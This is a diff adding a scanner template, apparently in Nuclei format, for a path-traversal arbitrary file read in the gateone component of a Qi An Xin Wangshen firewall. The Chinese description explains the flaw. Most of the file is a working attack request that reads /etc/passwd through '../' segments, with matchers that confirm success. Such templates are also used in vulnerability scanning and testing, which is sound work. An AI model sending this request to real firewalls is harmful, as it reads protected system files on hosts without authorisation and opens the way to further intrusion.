@@ -1,0 +1,27 @@
+id: wangshen-firewall-downloads-arbitrary-file-read
+
+info:
+  name: "奇安信网神防火墙gateone组件任意文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    奇安信网神防火墙系统中的gateone组件未正确实施路径过滤机制，允许远程攻击者通过构造特定路径参数访问非授权文件。该组件作为基于HTML5的终端仿真器和SSH客户端，在48620端口部署时，其文件访问控制逻辑存在缺陷，导致任意文件读取风险。
+  tags: 奇安信网神防火墙,gateone
+
+http:
+- raw:
+  - |
+    GET /downloads/../../../../etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'bin'
+  - type: word
+    part: body
+    words:
+    - 'bash'
